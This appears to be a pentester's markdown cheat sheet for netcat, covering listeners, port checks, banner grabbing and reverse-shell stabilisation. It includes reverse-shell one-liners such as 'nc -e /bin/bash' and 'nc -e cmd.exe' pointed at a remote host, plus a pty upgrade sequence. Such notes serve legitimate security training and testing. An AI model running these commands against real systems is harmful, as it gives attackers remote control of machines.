# Netcat - NC

## Listner

```
nc -nlvp <LPORT>
```

```
rlwrap -cAr nc -nlvp <LPORT>
```

## Connect

```
nc <RHOST> <RPORT>
```

Use `-e` to link the connection to a program 
```
nc -e /bin/bash <RHOST> <RPORT>
```

```
nc -e cmd.exe <RHOST> <RPORT>
```

## investigate ports

- test port
```
nc -zv <RHOST> <RPORT>
```

- get banner
```
echo "QUIT" | nc <RHOST> <RPORT>
```

- send http request
```
printf "GET / HTTP/1.0\r\n\r\n" | nc <RHOST> <RPORT>
```


## Stabilize Reverse Shell

```
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
Ctrl z
stty raw -echo; fg
```




## Links

[Stabilize a reverse shell](https://tkcyber.com/index.php/2022/06/19/stabilize-a-reverse-shell/)